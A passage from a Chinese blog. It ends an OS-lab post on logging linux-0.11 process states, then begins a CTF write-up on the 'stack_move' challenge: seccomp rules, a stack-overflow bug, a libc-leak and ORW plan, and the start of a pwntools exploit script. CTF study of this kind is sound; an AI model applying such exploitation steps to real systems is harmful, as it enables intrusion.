%1\n\t&quot;</span></span><br><span class="line">			<span class="string">&quot;pushl %2\n\t&quot;</span></span><br><span class="line">			<span class="string">&quot;call file_write\n\t&quot;</span></span><br><span class="line">			<span class="string">&quot;addl $12,%%esp\n\t&quot;</span></span><br><span class="line">			<span class="string">&quot;popl %0\n\t&quot;</span></span><br><span class="line">			<span class="string">&quot;pop %%fs&quot;</span> ::<span class="string">&quot;r&quot;</span>(i),<span class="string">&quot;r&quot;</span>(file),<span class="string">&quot;r&quot;</span>(inode)</span><br><span class="line">			: <span class="string">&quot;ax&quot;</span>, <span class="string">&quot;cx&quot;</span>, <span class="string">&quot;dx&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>PS：这里不能直接调用 write，因为 write 使用 <code>file=current-&gt;filp[fd]</code> 来获取文件描述符，此时 swapper 创建的非 init 进程就会因为缺少对应的文件描述符而发生错误</li>
</ul>
<p>接下来我们需要分析进程的运行轨迹，在 linux-0.11 中，进程有5个状态：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TASK_RUNNING			0 <span class="comment">/* 就绪状态 */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TASK_INTERRUPTIBLE		1 <span class="comment">/* 可打断的等待状态 */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TASK_UNINTERRUPTIBLE	2 <span class="comment">/* 不可打断的等待状态 */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TASK_ZOMBIE				3 <span class="comment">/* 僵死状态 */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TASK_STOPPED			4 <span class="comment">/* 挂起状态(在linux-0.11中并不会被设置) */</span></span></span><br></pre></td></tr></table></figure>
<ul>
<li>就绪状态：表示该进程可以获取 CPU 资源（似乎 linux-0.11 没有区分就绪状态和运行状态）</li>
<li>可打断的等待状态：等待资源有效时唤醒，可以被其他进程或中断信号所打断</li>
<li>不可打断的等待状态：等待资源有效时唤醒，不能被其他进程或中断信号所打断</li>
<li>僵死状态：进程资源用户空间被释放，但内核中的进程PCB并没有释放 </li>
<li>挂起状态：进程被外部程序暂停</li>
</ul>
<p>linux-0.11 的进程状态转化图如下：</p>
<img src="/2023/10/26/HIT-OSLab3/1698330533711.png" class width="1698330533711"> 
<ul>
<li>TASK_UNINTERRUPTIBLE 只能被 <code>wake_up</code> 唤醒</li>
<li>TASK_INTERRUPTIBLE 可以被 <code>wake_up</code> 与 <code>schedule</code> 唤醒</li>
</ul>
<p>先分析一下 linux-0.11 与进程调度相关的几个函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">schedule</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,next,c;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> ** <span class="title">p</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* check alarm, wake up any interruptible tasks that have got a signal */</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(p = &amp;LAST_TASK ; p &gt; &amp;FIRST_TASK ; --p) <span class="comment">/* 更新可以被调度的程序 */</span></span><br><span class="line">		<span class="keyword">if</span> (*p) &#123;</span><br><span class="line">			<span class="keyword">if</span> ((*p)-&gt;alarm &amp;&amp; (*p)-&gt;alarm &lt; jiffies) &#123;</span><br><span class="line">					(*p)-&gt;signal |= (<span class="number">1</span>&lt;&lt;(SIGALRM<span class="number">-1</span>));</span><br><span class="line">					(*p)-&gt;alarm = <span class="number">0</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			<span class="keyword">if</span> (((*p)-&gt;signal &amp; ~(_BLOCKABLE &amp; (*p)-&gt;blocked)) &amp;&amp;</span><br><span class="line">			(*p)-&gt;state==TASK_INTERRUPTIBLE)&#123;</span><br><span class="line">                <span class="comment">/* 接收到中断信号(等待资源已满足) &amp;&amp; TASK_INTERRUPTIBLE */</span></span><br><span class="line">				(*p)-&gt;state=TASK_RUNNING;</span><br><span class="line">				writelogf(<span class="string">&quot;%d\tJ\t%d\n&quot;</span>,(*p)-&gt;pid,jiffies);</span><br><span class="line">			&#125;</span><br><span class="line">				</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* this is the scheduler proper: */</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>) &#123; <span class="comment">/* 处理调度前的配置,选择下一个将要被调度的进程 */</span></span><br><span class="line">		c = <span class="number">-1</span>;</span><br><span class="line">		next = <span class="number">0</span>;</span><br><span class="line">		i = NR_TASKS;</span><br><span class="line">		p = &amp;task[NR_TASKS];</span><br><span class="line">		<span class="keyword">while</span> (--i) &#123;</span><br><span class="line">			<span class="keyword">if</span> (!*--p)</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			<span class="keyword">if</span> ((*p)-&gt;state == TASK_RUNNING &amp;&amp; (*p)-&gt;counter &gt; c) </span><br><span class="line">                <span class="comment">/* (*p)-&gt;counter是时间片(用于表示该进程执行的时间) */</span></span><br><span class="line">				c = (*p)-&gt;counter, next = i; <span class="comment">/* 选择counter最大的进程进行调度 */</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (c) <span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">for</span>(p = &amp;LAST_TASK ; p &gt; &amp;FIRST_TASK ; --p)</span><br><span class="line">			<span class="keyword">if</span> (*p)</span><br><span class="line">				(*p)-&gt;counter = ((*p)-&gt;counter &gt;&gt; <span class="number">1</span>) +</span><br><span class="line">						(*p)-&gt;priority; <span class="comment">/* 更新调度时间片 */</span></span><br><span class="line">	&#125;</span><br><span class="line">	switch_to(next); <span class="comment">/* 从当前进程切换到另一个进程 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>函数 <code>schedule</code> 每次开始调度前，都会先检查是否有满足 TASK_RUNNING 条件的进程，然后使其带上 TASK_RUNNING 标记</li>
<li>接下来 <code>schedule</code> 会在带有 TASK_RUNNING 的进程中，选择 counter 最大的进程为目标</li>
<li>然后 <code>schedule</code> 会更新所有进程的时间片（算法为：<code>counter=2*counter+priority</code>） </li>
<li>最后使用 <code>switch_to(next)</code> 切换到目标进程</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_timer</span><span class="params">(<span class="keyword">long</span> cpl)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">extern</span> <span class="keyword">int</span> beepcount;</span><br><span class="line">	<span class="function"><span class="keyword">extern</span> <span class="keyword">void</span> <span class="title">sysbeepstop</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (beepcount)</span><br><span class="line">		<span class="keyword">if</span> (!--beepcount)</span><br><span class="line">			sysbeepstop();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (cpl)</span><br><span class="line">		current-&gt;utime++;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		current-&gt;stime++;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (next_timer) &#123;</span><br><span class="line">		next_timer-&gt;jiffies--;</span><br><span class="line">		<span class="keyword">while</span> (next_timer &amp;&amp; next_timer-&gt;jiffies &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="keyword">void</span> (*fn)(<span class="keyword">void</span>);</span><br><span class="line">			</span><br><span class="line">			fn = next_timer-&gt;fn;</span><br><span class="line">			next_timer-&gt;fn = <span class="literal">NULL</span>;</span><br><span class="line">			next_timer = next_timer-&gt;next;</span><br><span class="line">			(fn)();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (current_DOR &amp; <span class="number">0xf0</span>)</span><br><span class="line">		do_floppy_timer(); <span class="comment">/* 内核线程函数,负责处理Floppy设备的定时器中断 */</span></span><br><span class="line">	<span class="keyword">if</span> ((--current-&gt;counter)&gt;<span class="number">0</span>) <span class="keyword">return</span>; <span class="comment">/* 随着current占用CPU资源,current-&gt;counter逐渐减少 */</span></span><br><span class="line">	current-&gt;counter=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (!cpl) <span class="keyword">return</span>;</span><br><span class="line">	schedule(); <span class="comment">/* 当前进程时间片用完后,执行调度程序 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>函数 <code>do_timer</code> 是内核中的一个内核线程函数，负责处理系统定时器，并在定时器触发时执行相应的操作</li>
<li>函数 <code>do_timer</code> 的执行周期是由内核调度器设置的，代表了内核调度器处理进程调度的速度</li>
<li>在 <code>do_timer</code> 中，当前正在运行的进程的时间片会逐渐减少，意味着该进程的 “优先程度” 会逐步下降</li>
</ul>
<p>上述两个函数体现了 linux-0.11 调度的核心思想：基于动态优先级的时间片轮转调度</p>
<ul>
<li>占用 CPU 资源会导致 “时间片” 下降，等待调度会导致 “时间片” 上升</li>
<li>调度程序优先调用 “时间片” 大的进程</li>
<li>新进入 <code>task[NR_TASKS]</code> 的进程优先级比较低，因此没有抢占机制</li>
</ul>
<p>回到实验，为了记录进程的运行轨迹，我们只需要在内核修改 <code>p-&gt;state</code> 的代码后调用 <code>writelogf</code> 即可</p>
<p>有一点需要注意，在 <code>sleep_on</code> 函数中需要特殊处理：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sleep_on</span><span class="params">(struct task_struct **p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">tmp</span>;</span></span><br><span class="line">    ......</span><br><span class="line">	<span class="keyword">if</span>(current-&gt;pid != <span class="number">1</span>)</span><br><span class="line">		writelogf(<span class="string">&quot;%d\tW\t%d\n&quot;</span>,current-&gt;pid,jiffies);</span><br><span class="line">	schedule();</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>之前我们没有选择在 swapper 进程中创建 <code>/var/process.log</code>，并且 init 进程在调用 <code>setup((void *) &amp;drive_info)</code> 时就会执行到 <code>sleep_on</code> 函数</li>
<li>由于在 init 进程调用 <code>sleep_on</code> 时，文件 <code>/var/process.log</code> 并没有创建完毕，所以此时调用 <code>writelogf</code> 就会导致系统错误</li>
</ul>
<p>另外在 <code>schedule</code> 函数中有一点需要注意：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(current-&gt;pid != task[next]-&gt;pid)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>(current-&gt;state == TASK_RUNNING)</span><br><span class="line">		writelogf(<span class="string">&quot;%d\tJ\t%d\n&quot;</span>,current-&gt;pid,jiffies);</span><br><span class="line">	writelogf(<span class="string">&quot;%d\tR\t%d\n&quot;</span>,task[next]-&gt;pid,jiffies);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>记录 task[next] 进程的状态</li>
</ul>
<p>到了实验的最后一步，需要先编译并执行之前写的 <code>process.c</code>：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -o process process.c</span><br><span class="line">./process</span><br><span class="line">sync # 刷新cache,确保文件确实写入了磁盘</span><br></pre></td></tr></table></figure>
<p>效果如如下：</p>
<img src="/2023/10/26/HIT-OSLab3/1698325401290.png" class width="1698325401290">  
<p>接着就可以用 <code>mount-hdc</code> 挂载文件，并把 <code>/oslab/hdc/var/process.log</code> 拿出，然后使用 stat_log.py 脚本进行测试：（由于我没有记录完整的 init 进程，因此我这里只测试 process 以及它生成的子进程）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">(Unit: tick)</span><br><span class="line">Process   Turnaround   Waiting   CPU Burst   I/O Burst</span><br><span class="line">      <span class="number">0</span>        <span class="number">23207</span>         <span class="number">0</span>           <span class="number">0</span>           <span class="number">0</span></span><br><span class="line">      <span class="number">6</span>        <span class="number">14617</span>         <span class="number">7</span>           <span class="number">2</span>       <span class="number">14607</span></span><br><span class="line">      <span class="number">7</span>        <span class="number">14614</span>     <span class="number">12606</span>        <span class="number">1801</span>         <span class="number">206</span></span><br><span class="line">      <span class="number">8</span>        <span class="number">14612</span>     <span class="number">12606</span>        <span class="number">1801</span>         <span class="number">205</span></span><br><span class="line">      <span class="number">9</span>        <span class="number">14610</span>     <span class="number">12605</span>        <span class="number">1800</span>         <span class="number">205</span></span><br><span class="line">     <span class="number">10</span>        <span class="number">14610</span>     <span class="number">12604</span>        <span class="number">1801</span>         <span class="number">204</span></span><br><span class="line">     <span class="number">11</span>        <span class="number">14608</span>     <span class="number">12604</span>        <span class="number">1800</span>         <span class="number">204</span></span><br><span class="line">     <span class="number">12</span>        <span class="number">14606</span>     <span class="number">12603</span>        <span class="number">1800</span>         <span class="number">203</span></span><br><span class="line">     <span class="number">13</span>        <span class="number">14606</span>     <span class="number">12602</span>        <span class="number">1801</span>         <span class="number">202</span></span><br><span class="line">     <span class="number">14</span>        <span class="number">14604</span>     <span class="number">12602</span>        <span class="number">1800</span>         <span class="number">202</span></span><br><span class="line">     <span class="number">15</span>            <span class="number">3</span>         <span class="number">0</span>           <span class="number">3</span>           <span class="number">0</span></span><br><span class="line">     <span class="number">16</span>            <span class="number">3</span>         <span class="number">0</span>           <span class="number">1</span>           <span class="number">1</span></span><br><span class="line">Average:    <span class="number">12891.67</span>   <span class="number">8403.25</span></span><br><span class="line">Throughout: <span class="number">0.03</span>/s</span><br></pre></td></tr></table></figure>
<ul>
<li>在运行测试脚本之前，要先手动将不需要的 pid 给去除</li>
<li>否则就会因为缺少 swapper 线程（包括它的非 init 子进程）的部分信息而引发报错</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/24/%E7%BB%BF%E7%9B%9F%E6%9D%AFCTF2023/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/10/24/%E7%BB%BF%E7%9B%9F%E6%9D%AFCTF2023/" class="post-title-link" itemprop="url">绿盟杯CTF2023</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-10-24 13:48:13" itemprop="dateCreated datePublished" datetime="2023-10-24T13:48:13+08:00">2023-10-24</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-11-09 00:01:21" itemprop="dateModified" datetime="2023-11-09T00:01:21+08:00">2023-11-09</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Competition/" itemprop="url" rel="index"><span itemprop="name">Competition</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>33k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>30 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="stack-move"><a href="#stack-move" class="headerlink" title="stack_move"></a>stack_move</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.9</span>)</span> stable release version 2.31.</span></span><br><span class="line"><span class="function">Compiled by GNU CC version 9.4.0.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vuln: ELF <span class="number">64</span>-bit LSB executable, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter ./ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, BuildID[sha1]=<span class="number">71608</span>a3832e991be0d289c6a86027c189b0c76ff, <span class="keyword">not</span> stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x3fe000</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，Partial RELRO，NX</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"><span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x06</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"><span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"><span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) <span class="keyword">goto</span> <span class="number">0005</span></span><br><span class="line"><span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x03</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"><span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x0000003b</span>  <span class="keyword">if</span> (A == execve) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"><span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x00000142</span>  <span class="keyword">if</span> (A == execveat) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"><span class="number">0007</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"><span class="number">0008</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure>
<ul>
<li>ban 了 execve</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>简单栈溢出：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">256</span>]; <span class="comment">// [rsp+0h] [rbp-100h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x130</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>先利用栈溢出写一个 <code>puts(puts_got)</code> 用于泄露 libc_base，然后填一个 main_addr 写循环</p>
<p>接下来可以选择栈迁移，也可以直接构造 <code>read(0,stack_addr,0x300)</code>（由于之前执行过 read，前两个参数不用修改）</p>
<p>最后写一个 ORW 即可</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./vuln2&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;175.20.23.59&#x27;</span>,<span class="string">&#x27;9999&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b* 0x401268\n&quot;</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p,&quot;b *$rebase(0x1409)\nb *$rebase(0x137A)\n&quot;)</span></span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span 